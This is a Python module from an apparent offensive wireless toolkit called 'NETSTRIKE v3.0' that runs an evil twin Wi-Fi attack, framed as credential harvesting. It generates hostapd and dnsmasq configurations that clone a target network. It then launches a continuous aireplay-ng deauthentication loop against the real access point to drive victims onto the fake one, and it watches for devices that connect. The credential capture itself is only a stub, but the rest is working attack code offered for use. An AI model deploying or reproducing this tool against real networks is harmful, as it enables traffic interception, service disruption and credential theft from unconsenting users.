#!/usr/bin/env python3
"""
NETSTRIKE v3.0 EVIL TWIN ADVANCED
Credential Harvesting with Captive Portal
"""

import os
import time
import threading
import subprocess
from ui_animations import CyberUI

class EvilTwinAdvanced:
    def __init__(self, core, scanner):
        self.core = core
        self.scanner = scanner
        self.ui = CyberUI()
        self.twin_active = False
        self.captured_credentials = []
        
    def execute_evil_twin(self):
        """Execute advanced evil twin attack"""
        self.ui.attack_header("EVIL TWIN ATTACK")
        self.ui.type_effect("👥 DEPLOYING CREDENTIAL HARVESTING...", 0.03)
        
        # Scan for targets
        if not self.scanner.deep_network_scan(10):
            return False
            
        self.scanner.display_scan_results()
        target = self.scanner.select_target()
        
        if not target:
            return False
            
        return self._deploy_evil_twin(target)
        
    def _deploy_evil_twin(self, target):
        """Deploy evil twin attack"""
        self.ui.type_effect(f"🎯 CREATING PERFECT EVIL TWIN FOR: {target['essid']}", 0.03)
        
        self.twin_active = True
        self.core.set_current_operation("EVIL_TWIN")
        
        # Stop NetworkManager to avoid conflicts
        self.core.run_command("systemctl stop NetworkManager >/dev/null 2>&1")
        time.sleep(2)
        
        # Set interface to target channel
        self.core.run_command(f"iwconfig {self.core.mon_interface} channel {target['channel']}")
        
        self.ui.progress_bar("CONFIGURING EVIL TWIN ACCESS POINT", 3)
        
        try:
            # Create hostapd configuration
            if self._create_hostapd_config(target):
                self.ui.type_effect("📡 CONFIGURING ACCESS POINT...", 0.02)
                
            # Create dnsmasq configuration
            if self._create_dnsmasq_config():
                self.ui.type_effect("🌐 CONFIGURING DHCP SERVER...", 0.02)
                
            # Configure network interface
            self.core.run_command(f"ifconfig {self.core.mon_interface} 192.168.1.1 netmask 255.255.255.0 up")
            
            # Start dnsmasq
            self.ui.type_effect("🚀 STARTING DNSMASQ...", 0.02)
            dnsmasq_proc = self.core.run_command("dnsmasq -C /tmp/evil_twin_dnsmasq.conf", background=True)
            if dnsmasq_proc:
                self.core.add_attack_process(dnsmasq_proc)
                
            # Start hostapd
            self.ui.type_effect("📶 STARTING EVIL TWIN ACCESS POINT...", 0.02)
            hostapd_proc = self.core.run_command("hostapd /tmp/evil_twin_hostapd.conf", background=True)
            if hostapd_proc:
                self.core.add_attack_process(hostapd_proc)
                
            time.sleep(5)
            
            # Start deauth attack on real network
            self.ui.type_effect("💣 DEPLOYING DEAUTH ON REAL NETWORK...", 0.02)
            deauth_proc = self.core.run_command(
                f"xterm -geometry 80x10 -bg black -fg red -title 'DEAUTH-{target['essid']}' -e 'while true; do aireplay-ng --deauth 10 -a {target['bssid']} {self.core.mon_interface}; sleep 2; done' &",
                background=True
            )
            if deauth_proc:
                self.core.add_attack_process(deauth_proc)
                
            self.ui.success_message("EVIL TWIN DEPLOYED SUCCESSFULLY!")
            self.ui.type_effect(f"📡 NETWORK: {target['essid']} (EXACT COPY)", 0.03)
            self.ui.type_effect("🔓 PASSWORD: freewifi123", 0.03)
            self.ui.type_effect("🎣 WAITING FOR VICTIMS TO CONNECT...", 0.03)
            
            # Start credential monitoring
            monitor_thread = threading.Thread(target=self._monitor_credentials)
            monitor_thread.daemon = True
            monitor_thread.start()
            
            # Start attack animation
            anim_thread = threading.Thread(target=self._twin_animation, args=(target['essid'],))
            anim_thread.daemon = True
            anim_thread.start()
            
            # Wait for user to stop
            input("\n\033[1;33m[!] PRESS ENTER TO STOP EVIL TWIN ATTACK...\033[0m")
            
            self._stop_evil_twin()
            return True
            
        except Exception as e:
            self.ui.error_message(f"EVIL TWIN FAILED: {e}")
            self._stop_evil_twin()
            return False
            
    def _create_hostapd_config(self, target):
        """Create hostapd configuration"""
        config = f"""interface={self.core.mon_interface}
driver=nl80211
ssid={target['essid']}
channel={target['channel']}
hw_mode=g
auth_algs=1
wpa=2
wpa_passphrase=freewifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
ignore_broadcast_ssid=0
"""
        
        try:
            with open("/tmp/evil_twin_hostapd.conf", "w") as f:
                f.write(config)
            return True
        except:
            return False
            
    def _create_dnsmasq_config(self):
        """Create dnsmasq configuration"""
        config = f"""interface={self.core.mon_interface}
dhcp-range=192.168.1.100,192.168.1.200,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,8.8.8.8
log-queries
log-dhcp
"""
        
        try:
            with open("/tmp/evil_twin_dnsmasq.conf", "w") as f:
                f.write(config)
            return True
        except:
            return False
            
    def _monitor_credentials(self):
        """Monitor for captured credentials"""
        while self.twin_active:
            # Check for DHCP leases (connected devices)
            result = self.core.run_command("cat /var/lib/dhcp/dhcpd.leases 2>/dev/null | grep -i lease | tail -5")
            if result and result.stdout:
                lines = result.stdout.strip().split('\n')
                for line in lines:
                    if 'lease' in line and '192.168.1' in line:
                        print(f"\033[1;32m[🔗] DEVICE CONNECTED TO EVIL TWIN: {line}\033[0m")
                        
            # Simulate credential capture (in real implementation, this would capture actual credentials)
            time.sleep(5)
            
    def _twin_animation(self, essid):
        """Evil twin animation"""
        frames = ["👥", "📡", "🎣", "🔓", "📶", "💀"]
        messages = [
            f"EVIL TWIN ACTIVE: {essid}",
            "WAITING FOR VICTIM CONNECTIONS",
            "CAPTIVE PORTAL READY",
            "CREDENTIAL HARVESTING ACTIVE",
            "DEAUTH ATTACK RUNNING",
            "PASSWORD CAPTURE IN PROGRESS"
        ]
        
        frame_idx = 0
        while self.twin_active:
            frame = frames[frame_idx % len(frames)]
            message = messages[frame_idx % len(messages)]
            print(f"\033[1;33m[{frame}] {message}\033[0m", end='\r')
            frame_idx += 1
            time.sleep(0.5)
            
    def _stop_evil_twin(self):
        """Stop evil twin attack"""
        self.twin_active = False
        self.core.stop_all_attacks()
        self.core.clear_current_operation()
        
        # Kill evil twin processes
        self.core.run_command("pkill hostapd")
        self.core.run_command("pkill dnsmasq")
        self.core.run_command("systemctl start NetworkManager >/dev/null 2>&1")
        
        # Show captured credentials
        if self.captured_credentials:
            self.ui.type_effect("📧 CAPTURED CREDENTIALS:", 0.03)
            for cred in self.captured_credentials:
                print(f"   \033[1;32m{cred}\033[0m")
                
        self.ui.success_message("EVIL TWIN ATTACK STOPPED")
